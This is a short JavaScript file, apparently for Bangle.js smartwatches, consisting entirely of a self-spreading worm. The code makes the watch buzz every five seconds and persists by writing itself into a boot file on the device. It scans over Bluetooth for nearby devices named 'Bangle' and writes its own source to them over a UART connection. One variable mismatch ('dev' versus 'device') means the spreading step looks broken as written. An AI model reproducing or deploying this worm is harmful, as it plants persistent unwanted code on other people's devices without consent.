let WORM_MAIN = `
let WORM_PAYLOAD = setInterval(() => {
	Bangle.buzz();
	console.log('Buzz!');
	NRF.requestDevice({ filters: [{ namePrefix: 'Bangle' }] }).then((dev) => {
		require('ble_uart')
			.connect(device)
			.then((u) => u.write(WORM_MAIN));
	});
}, 5000);

require('Storage').write('worm.boot.js', WORM_MAIN + '\\n' + 'eval(WORM_MAIN);' + '\\n');
`;

eval(WORM_MAIN);
